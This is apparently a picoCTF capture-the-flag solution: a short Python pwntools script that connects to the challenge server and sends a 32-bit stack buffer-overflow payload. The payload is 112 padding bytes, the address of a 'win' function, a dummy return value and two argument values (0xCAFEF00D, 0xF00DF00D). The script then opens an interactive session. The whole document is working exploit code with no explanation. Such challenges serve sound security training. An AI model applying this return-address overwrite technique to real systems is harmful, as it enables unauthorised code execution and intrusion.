from pwn import *

context.bits = 32

p = remote("saturn.picoctf.net", 60684)

win = p32(0x08049296)

cafefood = p32(0xCAFEF00D)
foodfood = p32(0xF00DF00D)

payload = b"A" * 112
payload += win
payload += p32(0x0)
payload += cafefood
payload += foodfood

p.sendline(payload)
p.interactive()
